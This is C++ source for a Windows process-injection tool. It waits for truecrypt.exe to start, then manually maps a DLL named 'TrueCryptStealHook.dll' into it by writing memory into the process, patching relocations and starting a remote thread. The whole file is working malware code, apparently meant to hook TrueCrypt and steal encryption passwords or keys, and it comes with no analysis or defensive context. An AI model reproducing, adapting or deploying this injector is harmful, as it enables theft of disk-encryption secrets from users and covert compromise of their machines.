#include "stdafx.h"

DWORD FindTrueCryptPid();
BOOL InjectProc(DWORD pid, HMODULE hModuleLibrary, int size_of_module);
void SetupAddressTable(HANDLE process, HMODULE hModuleLibrary, PBYTE loaded_address, PBYTE &base_addres, int* &address_of_entry_point);

int wmain(int argc, wchar_t* argv[])
{
	WCHAR dll_full_path[MAX_PATH];

	if (GetCurrentDirectoryW(MAX_PATH, dll_full_path) == 0)
		return 0;

	wcscat_s(dll_full_path, MAX_PATH, L"\\TrueCryptStealHook.dll");

	HMODULE hModuleLibrary = LoadLibraryW(dll_full_path);

	if (hModuleLibrary == NULL)
		return 0;

	MODULEINFO moduleInfo;
	GetModuleInformation(GetCurrentProcess(), hModuleLibrary, &moduleInfo, sizeof(MODULEINFO));
	int size_of_module = moduleInfo.SizeOfImage;

	DWORD pid = NULL;
	DWORD saved_pid = NULL;

	printf("Waiting TrueCrypt process...\n");

	while (true)
	{
		pid = FindTrueCryptPid();

		if (pid == NULL)
		{
			saved_pid = NULL;
		}
		else if (pid != saved_pid)
		{
			saved_pid = pid;
			printf("* TrueCrypt process is found (PID: %d)\n", pid);

			printf("* Start inject process...\n");
			if (InjectProc(pid, hModuleLibrary, size_of_module))
				printf("* Injection was successful\n");
			else
				printf("* Injection FAILED!\n");
		}

		Sleep(250);
	}

	return 0;
}

DWORD FindTrueCryptPid()
{
	DWORD pid = NULL;
	PROCESSENTRY32W pe;
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (snapshot == INVALID_HANDLE_VALUE)
		return NULL;

	pe.dwSize = sizeof(PROCESSENTRY32W);
	int select_proc = Process32FirstW(snapshot, &pe);
	while (select_proc)
	{
		CharLowerBuffW(pe.szExeFile, wcslen(pe.szExeFile));

		if (wcsstr(pe.szExeFile, L"truecrypt.exe"))
		{
			pid = pe.th32ProcessID;
			break;
		}

		select_proc = Process32Next(snapshot, &pe);
	}

	return pid;
}

BOOL InjectProc(DWORD pid, HMODULE hModuleLibrary, int size_of_module)
{
	HANDLE process = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
	if (process != NULL)
	{
		LPVOID alloc = VirtualAllocEx(process, (PBYTE)hModuleLibrary, size_of_module, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		if (alloc != NULL)
		{
			SIZE_T bytes_writen = 0;
			BOOL succ_write = WriteProcessMemory(process, alloc, (PBYTE)hModuleLibrary, size_of_module, &bytes_writen);

			if (succ_write != NULL && size_of_module == bytes_writen)
			{
				PBYTE base_addres = nullptr;
				int *address_of_entry_point = nullptr;

				SetupAddressTable(process, hModuleLibrary, (PBYTE)alloc, base_addres, address_of_entry_point);

				bytes_writen = 0;
				WriteProcessMemory(process, base_addres, &alloc, sizeof(int), &bytes_writen);

				HANDLE thread = CreateRemoteThread(process, NULL, 0, (LPTHREAD_START_ROUTINE)((PBYTE)alloc + *address_of_entry_point), alloc, 0, NULL);
				if (thread != NULL)
				{
					CloseHandle(thread);
					CloseHandle(process);
					return TRUE;
				}
			}
		}
	}

	CloseHandle(process);
	return FALSE;
}

void SetupAddressTable(HANDLE process, HMODULE hModuleLibrary, PBYTE loaded_address, PBYTE &base_addres, int* &address_of_entry_point)
{
	PBYTE after_DOS_loaded_address = loaded_address + *(PINT)(loaded_address + 0x3C);
	base_addres = (PBYTE)*(PINT)(after_DOS_loaded_address + 0x34);
	address_of_entry_point = (PINT)(after_DOS_loaded_address + 0x28);

	if ((PBYTE)hModuleLibrary != loaded_address)
	{
		PBYTE base_relocation_table = loaded_address + *(PINT)(after_DOS_loaded_address + 0xA0);

		int size_of_base_relocation_table = *(PINT)(after_DOS_loaded_address + 0xA4);
		int sife_of_base_relocation_table_chunk = *(PINT)(base_relocation_table + 4);

		int *edit_address = nullptr;
		int relocation_offset = base_addres - loaded_address;

		while ((*(PINT)base_relocation_table) != 0x0)
		{
			int count_settings_in_chunk = (sife_of_base_relocation_table_chunk - 8) / 2;

			for (int i = 0; i < count_settings_in_chunk; ++i)
			{
				if (((*(base_relocation_table + 8 + i * 2 + 1) & 0xf0) >> 4) != 3)
					continue;

				int offset_in_page = ((*(base_relocation_table + 8 + i * 2 + 1) & 0xf) << 8) | (*(base_relocation_table + 8 + i * 2) & 0xff);
				edit_address = (PINT)(base_addres + *(PINT)base_relocation_table + offset_in_page);

				int temp = *edit_address + relocation_offset;

				SIZE_T writen = 0;
				WriteProcessMemory(process, edit_address, &temp, sizeof(int), &writen);
			}

			base_relocation_table += sife_of_base_relocation_table_chunk;
			sife_of_base_relocation_table_chunk = *(PINT)(base_relocation_table + 4);
		}
	}
}